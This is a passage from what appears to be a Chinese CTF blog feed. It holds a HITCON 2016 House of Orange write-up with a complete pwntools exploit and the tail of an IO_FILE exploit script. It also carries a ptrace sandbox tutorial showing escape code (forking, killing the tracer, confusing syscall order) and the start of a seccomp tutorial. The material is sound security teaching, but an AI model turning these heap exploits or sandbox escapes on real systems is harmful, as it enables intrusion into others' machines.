write(addr, data):    while data != 0:        fake_file = IO_FILE_plus_struct()        fake_file._flags = 0x00000000fbad2887        fake_file._IO_read_end = buffer_addr        fake_file._IO_buf_base = addr        fake_file._fileno = 1        fake_file._lock = buffer_addr + 0x100        payload = &#39;A&#39; * 0x10 + p64(buffer_addr + 0x20) + p64(0) + str(fake_file)[:-8]        p.sendline(payload)        p.sendline(chr(data &amp; 0xff))        addr += 1        data &gt;&gt;= 8vtable_addr = buffer_addr + 0xf8libc_base = leak(vtable_addr) - libc.symbols[&#39;_IO_file_jumps&#39;]info(&#39;libc_base = &#39; + hex(libc_base))malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]one_gadget = libc_base + one_gadgets[1]#gdb.attach(p)write(malloc_hook, one_gadget)p.sendline(&#39;%66666c&#39;)p.recvuntil(&#39;\x7f&#39;)p.interactive()</code></pre><h1 id="2016-HITCON-houseoforange"><a href="#2016-HITCON-houseoforange" class="headerlink" title="2016-HITCON-houseoforange"></a>2016-HITCON-houseoforange</h1><p>通过 sysmalloc 构造 Free Chunk 的过程不过多叙述，主要是记录 IO_FILE 的利用。程序保护全开，流程大概如下。有建 House、升级 House、查看 House 三个功能：</p><pre><code class="cpp">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){  signed int c; // eax  sub_1218();  while ( 1 )  {    while ( 1 )    {      menu();      c = read_int();      if ( c != 2 )        break;      see();    }    if ( c &gt; 2 )    {      if ( c == 3 )      {        upgrade();      }      else      {        if ( c == 4 )        {          puts(&quot;give up&quot;);          exit(0);        }LABEL_14:        puts(&quot;Invalid choice&quot;);      }    }    else    {      if ( c != 1 )        goto LABEL_14;      build();    }  }}</code></pre><p>涉及到的结构体有 House 还有 Orange：</p><pre><code class="cpp">struct orange {  int price;  int color;};struct house {  struct orange *org;  char *name;};</code></pre><p>各个函数中大概是只能 Build 三次，每次只能 Upgrade 两次。其中在 Upgrade 时是重新输入 Name 的长度来读取，且只要小于 0x1000 就行，所以有 Heap Overflow：</p><pre><code class="cpp">int upgrade(){  struct orange *org; // rbx  unsigned int len; // [rsp+8h] [rbp-18h]  signed int color_id; // [rsp+Ch] [rbp-14h]  if ( times &gt; 2u )    return puts(&quot;You can&#39;t upgrade more&quot;);  if ( !houses )    return puts(&quot;No such house !&quot;);  printf(&quot;Length of name :&quot;);  len = read_int();  if ( len &gt; 0x1000 )    len = 0x1000;  printf(&quot;Name:&quot;);  read_buf(houses-&gt;name, len);  printf(&quot;Price of Orange: &quot;, len);  org = houses-&gt;org;  org-&gt;price = read_int();  color_menu();  printf(&quot;Color of Orange: &quot;);  color_id = read_int();  if ( color_id != 0xDDAA &amp;&amp; (color_id &lt;= 0 || color_id &gt; 7) )  {    puts(&quot;No such color&quot;);    exit(1);  }  if ( color_id == 0xDDAA )    houses-&gt;org-&gt;color = 0xDDAA;  else    houses-&gt;org-&gt;color = color_id + 30;  ++times;  return puts(&quot;Finish&quot;);}</code></pre><p>其中读 Name 时，用 read 来读，不会给 buf 后面补 0，所以可以泄漏出后面的内容：</p><pre><code class="cpp">ssize_t __fastcall read_buf(void *buf, unsigned int len){  ssize_t result; // rax  result = read(0, buf, len);  if ( (signed int)result &gt; 0 )    return result;  puts(&quot;read error&quot;);  exit(1);  return result;}</code></pre><p>然后这里利用 IO_FILE 的思路大概如下，利用 Unsortedbin Attack 的特性，下次 malloc 的时候，程序会调用 <code>malloc_printeer</code> 输出错误信息，最终一层层调用到 vtable 中的 <code>_IO_overflow_t</code>：</p><pre><code> +--------------------+ | malloc_printerr    | +--------------------+            |            v +--------------------+ | __libc_message     | +--------------------+            |            v +--------------------+ | abort              | +--------------------+            |            v +--------------------+ | _IO_flush_all_lockp| +--------------------+            |            v +--------------------+ | _IO_overflow_t     | +--------------------+</code></pre><p>在 <code>_IO_flush_all_lockp</code> 中，最终我们要执行 <code>_IO_OVERFLOW (fp, EOF)</code>，故要构造好 vtable 来改掉 <code>_IO_OVERFLOW</code>。前面的条件判断部分用 <code>||</code> 分为两部分，满足任一即可，（这里是 libc-2.23，根据前面 libc-2.24 及以后的版本的 IO_FILE 利用可以得出相应的 House-of-Orange 的做法）：</p><pre><code class="cpp">int_IO_flush_all_lockp (int do_lock){  int result = 0;  struct _IO_FILE *fp;  int last_stamp;#ifdef _IO_MTSAFE_IO  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);  if (do_lock)    _IO_lock_lock (list_all_lock);#endif  last_stamp = _IO_list_all_stamp;  fp = (_IO_FILE *) _IO_list_all;  while (fp != NULL)    {      run_fp = fp;      if (do_lock)    _IO_flockfile (fp);      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T       || (_IO_vtable_offset (fp) == 0           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif       )      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)    result = EOF;      if (do_lock)    _IO_funlockfile (fp);      run_fp = NULL;      if (last_stamp != _IO_list_all_stamp)    {      /* Something was added to the list.  Start all over again.  */      fp = (_IO_FILE *) _IO_list_all;      last_stamp = _IO_list_all_stamp;    }      else    fp = fp-&gt;_chain;    }#ifdef _IO_MTSAFE_IO  if (do_lock)    _IO_lock_unlock (list_all_lock);  __libc_cleanup_region_end (0);#endif  return result;}</code></pre><ul><li>条件 1 构造如下：<ul><li><code>fp-&gt;_mode = 0</code>（<code>fp-&gt;_mode &lt;= 0</code>）</li><li><code>fp-&gt;_IO_write_ptr = 1 ; fp-&gt;_IO_write_base = 0</code>（<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>）</li></ul></li><li>条件 2 构造如下（具体查看 <code>_IO_wide_data</code> 结构体）：<ul><li><code>fp-&gt;_mode = 1</code>（<code>fp-&gt;_mode &gt; 0</code>）</li><li><code>fp-&gt;_wide_data-&gt;_IO_write_ptr = _IO_read_end ; fp-&gt;_wide_data-&gt;_IO_write_base = _IO_read_ptr</code>（<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>）</li></ul></li></ul><p>接下来利用 Unsortedbin-Attack 将 <code>_IO_list_all</code> 的值改到 Unsortedbin 的位置（把这里当成 <code>_IO_2_1_stderr</code>）。然后在 Unsortedbin 上构造好一个大小为 0x60 的 Smallbin Chunk，同时在这里伪造一个能够 Bypass 的 IO_FILE 结构体。这样 <code>_IO_list_all</code> 的 <code>_chain</code> 就会指到这个地址的偏移 0x68 处（即 0x60 的 Smallbin），又指向我们在堆上构造的 IO_FILE（这里借用 veritas501 的图）：</p><pre><code class="txt"> +0x00 [       top        |  last_remainder   ] +0x10 [ unsorted bin fd  |  unsorted bin bk  ] +0x20 [ smallbin 0x20 fd | smallbin 0x20 bk  ] +0x30 [ smallbin 0x30 fd | smallbin 0x30 bk  ] +0x40 [ smallbin 0x40 fd | smallbin 0x40 bk  ] +0x50 [ smallbin 0x50 fd | smallbin 0x50 bk  ] +0x60 [ smallbin 0x60 fd | smallbin 0x60 bk  ] /* 0x68 */</code></pre><p>说实话最后一步一层一层调试还是很复杂的，而且如果调不到 one_gadget 都判断不了 ESP 的值对不对。最后总算是调出来了：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *from FILE import *context.arch = &#39;amd64&#39;#context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]def cmd(c):    p.recvuntil(&#39;Your choice :&#39;)    p.sendline(str(c))def build(length, name, price, color):    cmd(1)    p.recvuntil(&#39;Length of name :&#39;)    p.sendline(str(length))    p.recvuntil(&#39;Name :&#39;)    p.send(name)    p.recvuntil(&#39;Price of Orange:&#39;)    p.sendline(str(price))    p.recvuntil(&#39;Color of Orange:&#39;)    p.sendline(str(color))def see():    cmd(2)def upgrade(length, name, price, color):    cmd(3)    p.recvuntil(&#39;Length of name :&#39;)    p.sendline(str(length))    p.recvuntil(&#39;Name:&#39;)    p.send(name)    p.recvuntil(&#39;Price of Orange:&#39;)    p.sendline(str(price))    p.recvuntil(&#39;Color of Orange:&#39;)    p.sendline(str(color))def giveup():    cmd(4)p = process(&#39;./houseoforange&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)build(0x28, &#39;1&#39; * 8, 1, 1)upgrade(0x60, &#39;2&#39; * 0x40 + p64(0) + p64(0xf91), 1, 1) # Overflow top chunkbuild(0x1000, &#39;3&#39; * 0x8, 1, 1) # Trigger sysmallocbuild(0x500, &#39;4&#39; * 0x8, 1, 1) # Get a chunk from Unsorted-binsee() # Leak Unsorted-bin ptrp.recvuntil(&#39;4&#39; * 0x8)offset = 0x7fc27d99a188 - 0x7fc27d5d5000libc_base = u64(p.recvuntil(&#39;\n&#39;, drop=True).ljust(8, &#39;\x00&#39;)) - offsetinfo(&#39;libc_base = &#39; + hex(libc_base))if libc_base &amp; 0xffffffff &lt; 0x80000000:    warning(&#39;LOWWORD(libc_base) &lt; 0&#39;)    p.close()    exit(-1)one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]one_gadget = libc_base + one_gadgets[3]upgrade(0x500, &#39;5&#39; * 0x10, 1, 1)see()p.recvuntil(&#39;5&#39; * 0x10)heap_base = u64(p.recvuntil(&#39;\n&#39;, drop=True).ljust(8, &#39;\x00&#39;)) - 0xd0info(&#39;heap_base = &#39; + hex(heap_base))io_list_all = libc_base + libc.symbols[&#39;_IO_list_all&#39;]fake_file = IO_FILE_plus_struct()fake_file._IO_read_ptr = 0x61 # Small-bin sizefake_file._IO_read_base = io_list_all - 0x10 # Small-bin&#39;s bk ; Unsorted-bin Attackfake_file._mode = 0fake_file._IO_write_ptr = 1fake_file._IO_write_base = 0fake_file.vtable = heap_base + 0x6e0payload = &#39;6&#39; * 0x500 + p64(0) + p64(0x21) + p32(1) + p32(0x1f) + p64(0)payload += str(fake_file) # heap_base + 0x600payload += &#39;\x00&#39; * 0x18 + p64(one_gadget)info(&#39;one_gadget = &#39; + hex(one_gadget))#gdb.attach(p, &#39;dir ~/glibc-2.23/malloc\nb _int_malloc&#39; + &#39;\nc&#39; * 6)#gdb.attach(p, &#39;dir ~/glibc-2.23/libio\nb __libc_message\nb abort\nc&#39;)upgrade(0x800, payload, 1, 1)cmd(1)p.interactive()</code></pre><blockquote><p>House of Orange 并不是百分之百成功的，只有在 libc_base 的低 32 位为负数时才能成功，见<a href="https://www.anquanke.com/post/id/168802#h3-7" target="_blank" rel="noopener">这篇文章</a>。</p></blockquote><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/</a><br><a href="https://ctftime.org/writeup/12124" target="_blank" rel="noopener">https://ctftime.org/writeup/12124</a><br><a href="https://dangokyo.me/2017/12/13/hitcon-2016-ctf-quals-house-of-orange-write-up/" target="_blank" rel="noopener">https://dangokyo.me/2017/12/13/hitcon-2016-ctf-quals-house-of-orange-write-up/</a><br><a href="https://github.com/scwuaptx/CTF/blob/master/2016-writeup/hitcon/houseoforange.py" target="_blank" rel="noopener">https://github.com/scwuaptx/CTF/blob/master/2016-writeup/hitcon/houseoforange.py</a><br><a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="noopener">http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</a><br><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录 IO_FILE 相关知识。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux Sandbox - Ptrace</title>
    <link href="blog.b3ale.cn/2020/04/18/Linux-Sandbox-Ptrace/"/>
    <id>blog.b3ale.cn/2020/04/18/Linux-Sandbox-Ptrace/</id>
    <published>2020-04-18T14:15:40.000Z</published>
    <updated>2020-04-19T13:11:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>ptrace 是一个系统调用，也可以用作实现沙箱。</p><a id="more"></a><h1 id="What-is-Ptrace"><a href="#What-is-Ptrace" class="headerlink" title="What is Ptrace"></a>What is Ptrace</h1><p>ptrace 是一个系统调用，Tracer 进程可以监控和修改 Tracee 进程的运行状态，如内存、寄存器的值等。使用 ptrace 可以让某一进程处于受控状态，所以可以用作实现沙箱，如利用 ptrace 来监控 Tracee 使用哪些系统调用，并禁止 Tracee 使用某些危险的系统调用等。ptrace 使用信号来进行进程间通信：</p><pre><code class="bash">$ kill -l 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP 2) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR11)  SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM2)  SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP3)  SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ4)  SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR5)  SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+36)  SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+87)  SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+138)  SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-129)  SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-710) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-211) SIGRTMAX-1  64) SIGRTMAX</code></pre><h1 id="How-to-trace"><a href="#How-to-trace" class="headerlink" title="How to trace"></a>How to trace</h1><p>ptrace 的作用：</p><ul><li>Tracer 追踪 Tracee 的执行</li><li>拦截特定的事件（TRAP、SYSCALL）</li><li>读写 Tracee 的运行状态，如内存、寄存器的值等</li><li>用来实现 gdb 和 strace</li></ul><p>ptrace 的函数原型如下。其中 <code>request</code> 指明进行的操作，<code>pid</code> 为被追踪的进程（<code>pid</code>、<code>addr</code> 和 <code>data</code> 有时不会派上用场，根据具体情况而定）：</p><pre><code class="cpp">#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;long ptrace(enum __ptrace_request request, pid_t pid,                        void *addr, void *data);</code></pre><p><code>request</code> 有很多定义，这里记录几个常用的（详见 <a href="http://man7.org/linux/man-pages/man2/ptrace.2.html" target="_blank" rel="noopener">Linux Programmer’s Manual</a>）：</p><ul><li><code>PTRACE_TRACEME</code>：表明该进程会被父进程追踪。<code>pid</code>、<code>addr</code> 和 <code>data</code> 的值被忽略。这也是唯一能被 Tracee 使用的 <code>request</code>，其他的 <code>request</code> 都由 Tracer 指定；</li><li><code>PTRACE_ATTACH</code>：Tracer 向 Tracee 发送 SIGSTOP 信号使其暂停，并对 Tracee 追踪；</li><li><code>PTRACE_SEIZE</code>（从 Linux 3.4 开始有的 <code>request</code>）：追踪指定 <code>pid</code> 的进程，但不会像 <code>PTRACE_ATTACH</code> 一样让 Tracee 暂停。<code>addr</code> 必须为 0，<code>data</code> 指定 ptrace 选项；</li><li><code>PTRACE_DETACH</code>：解除追踪关系，Tracee 将继续运行；</li><li><code>PTRACE_CONT</code>：重启停止的 Tracee 进程，如果 <code>data</code> 不为 0，该值就会被当成对应的 Signal 传给 Tracee；反之不会发送 Signal。<code>addr</code> 的值被忽略；</li><li><code>PTRACE_SYSCALL</code>：在系统调用的入口或是出口处将 Tracee 进程停止并进行追踪。<code>addr</code> 的值被忽略；</li><li><code>PTRACE_PEEKUSER</code>：在 Tracee 的用户内存里获取一个字的数据，其中 <code>addr</code> 是在结构体 <code>user</code>（<code>/usr/include/sys/user.h</code>）中的偏移。</li></ul><h2 id="Trace-Child-Process"><a href="#Trace-Child-Process" class="headerlink" title="Trace Child Process"></a>Trace Child Process</h2><ul><li>先在子进程中调用 <code>ptrace(PTRACE_TRACEME)</code>；</li><li>在父进程中使用 <code>waitpid(pid)</code> 等待；</li><li>然后使用 <code>ptrace(PTRACE_CONT)</code> 继续执行；<ul><li>如果没有遇到 <code>int 0x3</code> 就会一直跑；</li><li>要追 syscall 的时候可以用 <code>ptrace(PTRACE_SYSCALL)</code>。</li></ul></li></ul><p>测试代码如下。子进程被父进程追踪，父进程在等待追踪结束后，重启子进程：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/wait.h&gt;int main(int argc, char **argv) {    pid_t pid = fork();    if (pid) {        while (1) {            int status;            waitpid(pid, &amp;status, 0);            if (WIFEXITED(status)){                break;            }            // ...            ptrace(PTRACE_CONT, pid, 0, 0);        }    } else {        ptrace(PTRACE_TRACEME, 0, 0, 0);        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, NULL);    }}</code></pre><h2 id="Trace-syscall"><a href="#Trace-syscall" class="headerlink" title="Trace syscall"></a>Trace syscall</h2><ul><li>使用 <code>ptrace(PTRACE_PEEKUSER)</code> 来读取 CPU；<ul><li>addr 为结构体 <code>user</code> 中的偏移；</li><li><a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/asm/user_32.h" target="_blank" rel="noopener"><code>arch/x86/include/asm/user_32.h</code></a>（<code>/usr/include/sys/user.h</code>）</li><li>orig_rax 为系统调用号；</li></ul></li><li>syscall 分别在 enter 和 exit 时各中断一次；<ul><li>exit 的时候可以在 rax 获取返回值。</li></ul></li></ul><p>添加一个 incall 来判断在 syscall 的 enter 和 exit 之间的切换，并在系统调用退出时输出调用号；然后获取 <code>user</code> 结构体中的 <code>orig_rax</code> 字段，即系统调用号：</p><pre><code class="cpp">    int incall = 0;    while (1) {        // ...        long orig_rax = ptrace(PTRACE_PEEKUSER, pid,            offsetof(struct user, regs.orig_rax), 0);        if (incall) {            printf(&quot;nr = %ld\n&quot;, orig_rax);        }        incall = ~incall;        ptrace(PTRACE_SYSCALL, pid, 0, 0);    }</code></pre><h2 id="读取-Tracee-的内容"><a href="#读取-Tracee-的内容" class="headerlink" title="读取 Tracee 的内容"></a>读取 Tracee 的内容</h2><ul><li><code>ptrace(PTRACE_PEEKDATA)</code></li><li>固定读一个字（4 字节）</li></ul><p><code>/bin/ls</code> 中调用了 write 进行输出，可以对 write 进行追踪并获取相应的内容：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/wait.h&gt;int main(int argc, char **argv) {    pid_t pid = fork();    if (pid) {        int incall = 0;        while (1) {            int status;            waitpid(pid, &amp;status, 0);            if (WIFEXITED(status)){                break;            }            long orig_rax = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.orig_rax), 0);            long rsi = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.rsi), 0);            long rdx = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.rdx), 0);            long rax = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.rax), 0);            //printf(&quot;nr = %ld\n&quot;, orig_rax);            if (incall) {                if (orig_rax == 1) {                    printf(&quot;write(\&quot;&quot;);                    for (int i = 0; i &lt; rdx; i++) {                        int d = ptrace(PTRACE_PEEKDATA, pid,                            rsi + i, 0);                        printf(&quot;%c&quot;, d &amp; 0xff);                    }                }            } else {                if (orig_rax == 1) {                    printf(&quot;\&quot;) = %d\n&quot;, (int)rax);                }            }            incall = ~incall;            ptrace(PTRACE_SYSCALL, pid, 0, 0);        }    } else {        ptrace(PTRACE_TRACEME, 0, 0, 0);        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, NULL);    }}</code></pre><p>运行结果：</p><pre><code class="bash">➜  ptrace ./ptracewrite(&quot;a  a.c    escape    escape.c  Makefile  ptrace  ptrace.ca  a.c    escape    escape.c  Makefile  ptrace  ptrace.c&quot;) = 51</code></pre><h1 id="Bypass-Ptrace-Sandbox"><a href="#Bypass-Ptrace-Sandbox" class="headerlink" title="Bypass Ptrace Sandbox"></a>Bypass Ptrace Sandbox</h1><ul><li>摆脱对 syscall 的追踪<ul><li>Fork 脱离 Tracer</li><li>砍掉父进程</li></ul></li><li>绕过 syscall 的检查<ul><li><code>syscall_restart</code> 等造成 incall 计算错误</li></ul></li></ul><h2 id="Escape-by-Fork"><a href="#Escape-by-Fork" class="headerlink" title="Escape by Fork"></a>Escape by Fork</h2><ul><li>只要 ptrace 没有跟踪好 fork、vfork、clone，子进程就不会被 ptrace 跟踪；</li><li>正确的做法是要继续跟好子进程，或者直接禁止 fork。<ul><li>可以设置 <code>PTRACE_O_TRACECLONE</code> 选项，会自动跟踪 clone 出来的新进程。</li></ul></li></ul><p>测试代码如下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/wait.h&gt;int main(int argc, char **argv) {    pid_t pid = fork();    if (pid) {        int incall = 0;        while (1) {            int status;            waitpid(pid, &amp;status, 0);            if (WIFEXITED(status)){                break;            }            long orig_rax = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.orig_rax), 0);            if (incall) {                if (orig_rax == 59) {                    printf(&quot;SYS_execve detected\n&quot;);                    kill(pid, SIGKILL);                    exit(0);                }            }            incall = ~incall;            ptrace(PTRACE_SYSCALL, pid, 0, 0);        }    } else {        ptrace(PTRACE_TRACEME, 0, 0, 0);        execl(&quot;./a&quot;, &quot;a&quot;, NULL);    }}</code></pre><p>子进程新 fork 一个进程来执行 execve：</p><pre><code class="cpp">    if (fork()) {        sleep(1);    } else {        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, 0);    }</code></pre><p>运行结果：</p><pre><code class="bash">➜  ptrace ./ptracea  a.c    escape    escape.c  Makefile  ptrace  ptrace.c</code></pre><h2 id="Escape-by-Kill"><a href="#Escape-by-Kill" class="headerlink" title="Escape by Kill"></a>Escape by Kill</h2><ul><li>杀死父进程；<ul><li><code>kill(getppid(), 9);</code>；</li><li>ppid 无法获取时可以尝试 pid-1；</li><li><code>/proc/self/stat</code> 中可以拿到 pid 和 ppid；</li><li><code>kill(-1, 9);</code> 杀死除了自己以外的所有进程。</li></ul></li><li>设置 <code>PTRACE_O_EXITKILL</code> 可以让 Tracer 结束时把所有的 Tracee 杀死。</li></ul><p>在子进程中杀死父进程：</p><pre><code class="cpp">    kill(getppid(), 9);    execl(&quot;/bin/ls&quot;, &quot;ls&quot;, 0);</code></pre><p>运行效果：</p><pre><code class="bash">➜  ptrace ./ptrace[1]    2211 killed     ./ptracea  a.c  escape  escape.c  Makefile  ptrace  ptrace.c</code></pre><p>用 alarm 和 sleep 可以搅乱 syscall 进出的顺序：</p><pre><code class="cpp">    alarm(1);    sleep(2);    execl(&quot;/bin/ls&quot;, &quot;ls&quot;, 0);</code></pre><p>加上一条用来判断进出 syscall 的输出：</p><pre><code class="cpp">            printf(&quot;%s %ld\n&quot;, (incall ? &quot;Enter&quot; : &quot;Exit&quot;), orig_rax);</code></pre><p>运行效果如下。在执行 alarm 后会导致 sys_nanosleep（35）由进入了一次，后面会调用一个 sys_restart_syscall（219），大概可能和 syscall 的原理有关。在这之后的 syscall 的顺序就会乱掉：</p><pre><code class="bash">Enter 35Exit 35Enter 35Exit 219Enter 219Exit 59Enter 59</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=gQXyZY7Ucjc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gQXyZY7Ucjc</a><br><a href="https://blog.betamao.me/2019/02/02/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bptrace/" target="_blank" rel="noopener">https://blog.betamao.me/2019/02/02/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bptrace/</a><br><a href="https://atum.li/2017/04/25/linuxsandbox/#ptrace" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox/#ptrace</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ptrace 是一个系统调用，也可以用作实现沙箱。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux Sandbox - Seccomp</title>
    <link href="blog.b3ale.cn/2020/04/17/%5BTODO%5DLinux-Sandbox-Seccomp/"/>
    <id>blog.b3ale.cn/2020/04/17/%5BTODO%5DLinux-Sandbox-Seccomp/</id>
    <published>2020-04-17T02:21:52.000Z</published>
    <updated>2020-04-25T03:38:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>Seccomp 可以为“不可信的纯计算型代码”提供一个“安全（SAFE, not SECURE）”的运行环境，以保护你的系统和应用程序的正常运行不受不可信代码的干扰。</p><a id="more"></a><h1 id="Seccomp-Sandbox"><a href="#Seccomp-Sandbox" class="headerlink" title="Seccomp Sandbox"></a>Seccomp Sandbox</h1><p>Seccomp（Secure Computing mode）是 Linux 提供的一种沙箱机制，可以用来限制程序可以使用和不可使用的系统调用。简洁、优美是 Seccomp 的优点，但只能支持“纯计算型”代码却使得其应用受到很大限制。比如，Seccomp 模式的进程不能动态分配内存、不能与其它进程使用共享内存、不能使用新的文件描述符、等等。如果要支持具有丰富功能的应用程序，则需要另外的方法来截获并处理其它系统调用。Seccomp 沙箱主要有两种模式，<code>SECCOMP_SET_MODE_STRICT</code> 只运行调用 4 个系统调用 <code>read()</code>、<code>write()</code>、<code>exit()</code>、<code>sigreturn()</code> 四个系统调用，而 <code>SECCOMP_SET_MODE_FILTER</code> 则允许通过 BPF 指定系统调用的黑名单或者白名单。</p><p>Seccomp 本身是一种很安全的技术，但是在 <code>SECCOMP_SET_MODE_FILTER</code> 环境下通常会因为 BPF 使用不正确导致沙箱存在被绕过的可能。</p><ul><li>限制一个程序能够使用的系统调用，可以是黑名单或白名单；</li><li>根据 Filter 的内容决定遇到系统调用时采取的行为，包括 kill、allow、trap 等等；</li><li>Filter 可以做简单的计算、条件判断。</li></ul><blockquote><p>早期直接使用 <code>prctl</code> 来开启 Seccomp。现在已经有 libseccomp 库，可以直接使用 <code>seccomp_init</code>、<code>seccomp_rule_add</code>、<code>seccomp_load</code> 来设定规则。</p></blockquote><h2 id="Seccomp-using-prctl"><a href="#Seccomp-using-prctl" class="headerlink" title="Seccomp using prctl"></a>Seccomp using <code>prctl</code></h2><p>Seccomp 采用 Berkeley Packet Filter（BPF）格式，原本在防火墙（iptables）中用来过滤封包。使用 Seccomp 需要有 <code>CAP_SYS_ADMIN</code> Capability（相当于 root 的权限），非 root 用户则通过设置 PR_SET_NO_NEW_PRIVS 位来获取 <code>CAP_SYS_ADMIN</code> Capability。这样能保证 Seccomp 对所有用户都能起作用，并且会使子进程即 execve 后的进程依然受控。获取 <code>CAP_SYS_ADMIN</code> Capability 后，就可以开启相应的自定义规则。具体的规则定义在参数 <code>prog</code> 中：</p><pre><code class="cpp">prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); // 获取 CAP_SYS_ADMIN 权限prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog); // 开启自定义的过滤规则</code></pre><p>接下来看看 <code>prog</code> 对应的结构体 <code>sock_fprog</code> 以及用于过滤系统调用的结构体 <code>sock_filter</code>，主要定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/filter.h" target="_blank" rel="noopener">include/uapi/linux/filter.h</a>（<code>/usr/include/linux/filter.h</code>）中。其中 <code>sock_fprog</code> 第一个成员 <code>len</code> 记录过滤规则的个数；第二个成员 <code>filter</code> 是一个 <code>sock_filter</code> 数组，用于记录相应的过滤规则：</p><pre><code class="cpp">/* *    Try and keep these values and structures similar to BSD, especially *    the BPF code definitions which need to match so you can share filters */struct sock_filter {    /* Filter block */    __u16    code;   /* Actual filter code */    __u8    jt;    /* Jump true */    __u8    jf;    /* Jump false */    __u32    k;      /* Generic multiuse field */};struct sock_fprog {    /* Required for SO_ATTACH_FILTER. */    unsigned short        len;    /* Number of filter blocks */    struct sock_filter __user *filter;};</code></pre><p>为了方便操作 <code>sock_filter</code>，还定义了一组宏：</p><pre><code class="cpp">/* * Macros for filter block array initializers. */#ifndef BPF_STMT#define BPF_STMT(code, k) { (unsigned short)(code), 0, 0, k }#endif#ifndef BPF_JUMP#define BPF_JUMP(code, k, jt, jf) { (unsigned short)(code), jt, 